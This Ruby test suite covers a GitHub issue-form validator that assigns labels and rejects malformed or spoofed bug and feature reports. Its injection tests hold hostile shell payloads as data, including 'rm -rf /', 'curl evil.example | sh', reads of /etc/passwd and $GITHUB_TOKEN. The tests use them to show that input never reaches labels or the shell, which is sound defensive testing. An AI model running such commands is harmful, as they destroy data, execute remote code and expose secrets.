#!/usr/bin/env ruby
# frozen_string_literal: true

require 'minitest/autorun'
require 'yaml'
require 'open3'
require 'tmpdir'

require_relative 'issue-metadata'

class IssueMetadataTest < Minitest::Test
  CONTRACT_PATH = File.expand_path('../issue-automation.json', __dir__)
  TEMPLATE_DIR = File.expand_path('../ISSUE_TEMPLATE', __dir__)
  BUG_EN = 'bug_report.yml'
  FEATURE_EN = 'feature_request.yml'

  # Renders an Issue Form the way GitHub renders a submitted issue, so every
  # fixture follows the shipped templates instead of restating their headings.
  class FormRenderer
    def initialize(file)
      @document = YAML.safe_load(File.read(File.join(TEMPLATE_DIR, file)))
    end

    def title(summary)
      "#{@document['title']}#{summary}"
    end

    def label(id)
      field(id)['attributes']['label'].to_s
    end

    def option(id, index)
      Array(field(id)['attributes']['options'])[index].to_s
    end

    def checkbox(id, index)
      Array(field(id)['attributes']['options'])[index]['label'].to_s
    end

    def render(values: {}, unchecked: [], skip: [])
      fields.reject { |element| skip.include?(element['id']) }
            .map { |element| section(element, values, unchecked) }
            .join("\n")
    end

    private

    def fields
      Array(@document['body']).reject { |element| element['type'] == 'markdown' }
    end

    def field(id)
      fields.find { |element| element['id'] == id }
    end

    def section(element, values, unchecked)
      attributes = element['attributes'] || {}
      body = if element['type'] == 'checkboxes'
               checkbox_lines(element, attributes, unchecked)
             else
               scalar_value(element, attributes, values)
             end
      "### #{attributes['label']}\n\n#{body}\n"
    end

    def scalar_value(element, attributes, values)
      id = element['id']
      value = values.key?(id) ? values[id] : default_value(element, attributes)
      return '_No response_' if value.nil? || value.to_s.strip.empty?

      language = attributes['render']
      language ? "```#{language}\n#{value}\n```" : value.to_s
    end

    def default_value(element, attributes)
      case element['type']
      when 'dropdown' then Array(attributes['options']).first.to_s
      when 'input' then 'v0.1.1'
      else "Filled in for #{element['id']}."
      end
    end

    def checkbox_lines(element, attributes, unchecked)
      Array(attributes['options']).map do |option|
        label = option['label'].to_s
        off = unchecked.include?(element['id']) || unchecked.include?(label)
        "- [#{off ? ' ' : 'x'}] #{label}"
      end.join("\n")
    end
  end

  RENDERERS = {
    BUG_EN => FormRenderer.new(BUG_EN),
    FEATURE_EN => FormRenderer.new(FEATURE_EN)
  }.freeze

  def setup
    @contract = IssueMetadata::Contract.load(CONTRACT_PATH)
  end

  def test_the_contract_matches_the_shipped_forms
    assert_empty IssueMetadata.verify(@contract)
  end

  def test_english_bug_form_is_valid
    report = analyze(BUG_EN, 'Agent does not respond after launch',
                     values: { 'area' => option(BUG_EN, 1) })

    assert report['valid'], report['errors'].join("\n")
    assert_equal 'bug', report['kind']
    assert_equal BUG_EN, report['form']
    assert_equal 'Agent & Models', report['area']
    assert_equal %w[bug area:agent], report['labels']
  end

  def test_english_feature_form_is_valid
    report = analyze(FEATURE_EN, 'Add a keyboard shortcut for a new session')

    assert report['valid'], report['errors'].join("\n")
    assert_equal 'feature', report['kind']
    assert_equal 'macOS App', report['area']
    assert_equal %w[enhancement area:macos], report['labels']
  end

  def test_every_area_option_maps_to_the_same_canonical_label
    @contract.areas.each_with_index do |area, index|
      [BUG_EN, FEATURE_EN].each do |file|
        report = analyze(file, 'Same area in English forms', values: { 'area' => option(file, index) })

        assert_equal area['area'], report['area'], "#{file} option #{index}"
        assert_equal area['label'], report['areaLabel'], "#{file} option #{index}"
        assert report['valid'], report['errors'].join("\n")
      end
    end
  end

  def test_empty_required_value_is_reported
    report = analyze(BUG_EN, 'No version', values: { 'version' => nil })

    refute report['valid']
    assert_includes report['errors'].join("\n"), "### #{label(BUG_EN, 'version')}"
    assert_includes report['labels'], 'needs-more-info'
    assert_includes report['labels'], 'bug'
  end

  def test_missing_required_section_is_reported
    report = analyze(BUG_EN, 'No area section', skip: ['area'])

    refute report['valid']
    assert_includes report['errors'].join("\n"), "### #{label(BUG_EN, 'area')}"
    assert_nil report['areaLabel']
    assert_equal %w[bug needs-more-info], report['labels']
  end

  def test_empty_body_is_reported_without_raising
    report = IssueMetadata.analyze(title: '[Bug] Nothing at all', body: '', contract: @contract)

    refute report['valid']
    assert_includes report['errors'].join("\n"), 'matches no Issue Form'
    assert_equal %w[bug needs-more-info], report['labels']
  end

  def test_optional_field_may_stay_empty
    report = analyze(BUG_EN, 'No logs', values: { 'logs' => nil })

    assert report['valid'], report['errors'].join("\n")
  end

  def test_unchecked_required_checkbox_is_reported
    report = analyze(BUG_EN, 'Did not acknowledge', unchecked: ['checks'])

    refute report['valid']
    assert_includes report['errors'].join("\n"), checkbox(BUG_EN, 0)
    assert_includes report['labels'], 'needs-more-info'
  end

  def test_illegal_area_is_reported_with_the_allowed_options
    report = analyze(BUG_EN, 'Made up area', values: { 'area' => 'Performance' })

    refute report['valid']
    joined = report['errors'].join("\n")

    assert_includes joined, '"Performance" is not allowed'
    @contract.area_names.each { |name| assert_includes joined, name }
    assert_nil report['areaLabel']
    assert_equal %w[bug needs-more-info], report['labels']
  end

  def test_crlf_body_is_parsed_like_the_unix_body
    unix = analyze(BUG_EN, 'CRLF', values: { 'area' => option(BUG_EN, 2) })
    crlf = IssueMetadata.analyze(
      title: RENDERERS[BUG_EN].title('CRLF'),
      body: RENDERERS[BUG_EN].render(values: { 'area' => option(BUG_EN, 2) }).gsub("\n", "\r\n"),
      contract: @contract
    )

    assert crlf['valid'], crlf['errors'].join("\n")
    assert_equal 'area:ci-build', crlf['areaLabel']
    assert_equal unix['labels'], crlf['labels']
  end

  def test_repeated_analysis_of_the_same_body_is_idempotent
    title = RENDERERS[FEATURE_EN].title('Idempotent')
    body = RENDERERS[FEATURE_EN].render(values: { 'area' => option(FEATURE_EN, 4) })
    first = IssueMetadata.analyze(title: title, body: body, contract: @contract)
    second = IssueMetadata.analyze(title: title, body: body, contract: @contract)

    assert_equal first, second
    assert_equal %w[enhancement area:docs], second['labels']
  end

  def test_editing_an_invalid_issue_clears_the_needs_more_info_label
    invalid = analyze(BUG_EN, 'Will be fixed', unchecked: ['checks'])
    fixed = analyze(BUG_EN, 'Will be fixed', values: { 'area' => option(BUG_EN, 1) })

    assert_includes invalid['labels'], 'needs-more-info'
    refute_includes fixed['labels'], 'needs-more-info'
    assert_includes fixed['managedLabels'], 'needs-more-info'
  end

  def test_title_must_declare_a_kind
    report = IssueMetadata.analyze(
      title: 'Settings window is broken',
      body: RENDERERS[BUG_EN].render,
      contract: @contract
    )

    refute report['valid']
    assert_includes report['errors'].join("\n"), '[Bug] or [Feature]'
    assert_nil report['kindLabel']
    assert_equal ['area:macos', 'needs-more-info'], report['labels']
  end

  def test_title_needs_a_summary_after_the_prefix
    report = IssueMetadata.analyze(
      title: '[Bug]   ',
      body: RENDERERS[BUG_EN].render,
      contract: @contract
    )

    refute report['valid']
    assert_includes report['errors'].join("\n"), 'short summary after [Bug]'
  end

  def test_body_from_the_other_form_is_reported
    report = IssueMetadata.analyze(
      title: '[Bug] Filled in the feature form',
      body: RENDERERS[FEATURE_EN].render,
      contract: @contract
    )

    refute report['valid']
    assert_includes report['errors'].join("\n"), "filled in with #{FEATURE_EN}"
    assert_equal ['bug', 'area:macos', 'needs-more-info'], report['labels']
  end

  def test_free_form_body_is_reported_and_still_labelled
    report = IssueMetadata.analyze(
      title: '[Feature] Free form request',
      body: "Please add dark mode.\n\n- it would be nice\n",
      contract: @contract
    )

    refute report['valid']
    assert_includes report['errors'].join("\n"), 'matches no Issue Form'
    assert_equal %w[enhancement needs-more-info], report['labels']
  end

  # The `logs` textarea is rendered inside a fence, so a pasted log must never
  # open a section and satisfy a field the reporter left empty.
  def test_a_heading_inside_a_rendered_log_cannot_spoof_a_section
    spoof = "### #{label(BUG_EN, 'reproduction')}\n\n1. Launch the app.\n"
    report = analyze(BUG_EN, 'Spoofed log', values: { 'reproduction' => nil, 'logs' => spoof })

    refute report['valid']
    assert_includes report['errors'].join("\n"), "### #{label(BUG_EN, 'reproduction')}"
  end

  def test_a_checkbox_inside_a_textarea_cannot_satisfy_the_acknowledgement
    forged = "- [x] #{checkbox(BUG_EN, 0)}\n- [x] #{checkbox(BUG_EN, 1)}"
    report = analyze(BUG_EN, 'Forged acknowledgement', values: { 'actual' => forged }, unchecked: ['checks'])

    refute report['valid']
    assert_includes report['errors'].join("\n"), checkbox(BUG_EN, 0)
  end

  # The workflow passes the body through a file and only ever puts contract
  # labels on the command line, so no field value may reach a label.
  def test_shell_metacharacters_never_reach_a_label
    payload = "$(rm -rf /) `id` ; rm -rf / && curl evil.example | sh --input /etc/passwd 'quote\" $GITHUB_TOKEN"
    [BUG_EN, FEATURE_EN].each do |file|
      report = analyze(file, payload, values: injected_values(file, payload))

      assert report['valid'], "#{file}: #{report['errors'].join("\n")}"
      assert_empty report['labels'] - report['managedLabels'], file
    end
  end

  def test_an_illegal_area_payload_is_truncated_to_one_line
    payload = "#{'A' * 400}\n$(rm -rf /)"
    report = analyze(BUG_EN, 'Long illegal area', values: { 'area' => payload })

    refute report['valid']
    message = report['errors'].find { |error| error.include?('is not allowed') }

    refute_nil message
    refute_includes message, "\n"
    refute_includes message, 'A' * 200
  end

  def test_managed_labels_cover_every_label_the_contract_can_apply
    managed = @contract.managed_label_names

    @contract.kinds.each { |kind| assert_includes managed, kind['label']['label'] }
    @contract.areas.each { |area| assert_includes managed, area['label'] }
    assert_includes managed, @contract.needs_more_info_label
  end

  def test_another_you_bug_environment_fields_are_required_but_model_details_are_optional
    form = @contract.forms.for_kind('bug').first
    assert_equal %w[area version macos-version installation reproduction expected actual], form.required_ids
    assert_equal 2, form.required_options.length
    report = analyze(BUG_EN, 'A source-only failure', values: { 'runtime' => nil, 'model' => nil, 'logs' => nil })
    assert report['valid'], report['errors'].join("\n")
  end

  def test_all_dropdowns_reject_unknown_or_multiple_values
    ['curl example.invalid | sh', "Released app\nRun from source (make run)"].each do |value|
      report = analyze(BUG_EN, 'Unknown installation', values: { 'installation' => value })
      refute report['valid']
      assert_includes report['errors'].join("\n"), 'Installation or launch method'
    end
  end

  def test_supports_chinese_answers_and_area_aliases
    report = analyze(BUG_EN, '设置关闭后不能重新打开', values: {
      'area' => 'macOS 应用', 'reproduction' => '打开设置，关闭窗口，再从菜单打开设置。',
      'expected' => '设置窗口重新出现。', 'actual' => '点击后没有出现窗口。'
    })
    assert report['valid'], report['errors'].join("\n")
    assert_equal 'area:macos', report['areaLabel']
  end

  def test_required_values_reject_comments_and_placeholders
    ['', ' ', '<!-- Describe the behavior. -->', '<!-- unclosed', 'TBD', 'TODO', '...', 'N/A', '_No response_', '<description>', "1. ...\n2. ...", "- TODO\n- TBD"].each do |value|
      report = analyze(BUG_EN, 'Missing actual behavior', values: { 'actual' => value })
      refute report['valid'], value.inspect
      assert_includes report['errors'].join("\n"), 'Actual behavior'
    end
  end

  def test_duplicate_required_sections_are_invalid_even_when_one_is_empty
    ['', '<!-- unused -->', '0.1.0'].each do |value|
      body = RENDERERS[BUG_EN].render + "\n### Another You version\n\n#{value}\n"
      report = IssueMetadata.analyze(title: '[Bug] Duplicate version', body: body, contract: @contract)
      refute report['valid']
      assert_includes report['errors'].join("\n"), 'must appear exactly once'
    end
  end

  def test_comments_and_code_examples_cannot_supply_missing_sections
    actual = "### Actual behavior\n\nThe app exits immediately."
    ["<!--\n#{actual}\n-->", "```markdown\n#{actual}\n```", "~~~~\n#{actual}\n~~~~", actual.lines.map { |line| "    #{line}" }.join].each do |extra|
      body = RENDERERS[BUG_EN].render(skip: ['actual']) + "\n#{extra}"
      report = IssueMetadata.analyze(title: '[Bug] Missing actual behavior', body: body, contract: @contract)
      refute report['valid']
      assert_includes report['errors'].join("\n"), 'Actual behavior'
    end
  end

  def test_fenced_checkboxes_cannot_supply_acknowledgements
    body = RENDERERS[BUG_EN].render(unchecked: ['checks'])
    body += "\n```\n- [x] #{checkbox(BUG_EN, 0)}\n- [x] #{checkbox(BUG_EN, 1)}\n```"
    report = IssueMetadata.analyze(title: '[Bug] Missing acknowledgements', body: body, contract: @contract)
    refute report['valid']
    assert_includes report['errors'].join("\n"), 'Required checkbox'
  end

  def test_duplicate_form_ids_are_rejected
    document = YAML.safe_load(File.read(File.join(TEMPLATE_DIR, BUG_EN)))
    document['body'] << document['body'].find { |field| field['id'] == 'version' }
    error = assert_raises(IssueMetadata::ContractError) do
      IssueMetadata::Form.new(file: BUG_EN, kind: 'bug', document: document)
    end
    assert_includes error.message, 'duplicate field id'
  end

  def test_cli_json_returns_validation_errors_as_data_without_body_values
    Dir.mktmpdir('another-you-issue-contract-') do |directory|
      title_file = File.join(directory, 'title.txt')
      body_file = File.join(directory, 'body.md')
      File.write(title_file, '[Bug] Missing version')
      File.write(body_file, RENDERERS[BUG_EN].render(values: { 'version' => nil, 'actual' => 'SENSITIVE_TEST_FIXTURE' }))
      args = ['--title-file', title_file, '--body-file', body_file]
      output, status = Open3.capture2e('ruby', File.join(__dir__, 'issue-metadata.rb'), 'json', *args)
      assert status.success?, output
      report = JSON.parse(output)
      assert_equal false, report['valid']
      assert_includes report['labels'], 'needs-more-info'
      refute_includes output, 'SENSITIVE_TEST_FIXTURE'
      output, status = Open3.capture2e('ruby', File.join(__dir__, 'issue-metadata.rb'), 'validate', *args)
      refute status.success?, output
      assert_includes output, 'Another You version'
    end
  end

  def test_cli_labels_use_the_shared_contract_shape
    output, status = Open3.capture2e('ruby', File.join(__dir__, 'issue-metadata.rb'), 'labels')
    assert status.success?, output
    entries = JSON.parse(output)
    assert_equal @contract.managed_label_names, entries.map { |entry| entry.fetch('label') }
    entries.each { |entry| assert_equal %w[color description label], entry.keys.sort }
  end

  private

  def analyze(file, summary, **overrides)
    IssueMetadata.analyze(
      title: RENDERERS[file].title(summary),
      body: RENDERERS[file].render(**overrides),
      contract: @contract
    )
  end

  def option(file, index)
    RENDERERS[file].option('area', index)
  end

  def label(file, id)
    RENDERERS[file].label(id)
  end

  def checkbox(file, index)
    RENDERERS[file].checkbox('checks', index)
  end

  # Fills every free-text field of a form with the same hostile payload.
  def injected_values(file, payload)
    YAML.safe_load(File.read(File.join(TEMPLATE_DIR, file)))
        .fetch('body')
        .select { |element| %w[input textarea].include?(element['type']) }
        .to_h { |element| [element['id'], payload] }
  end
end
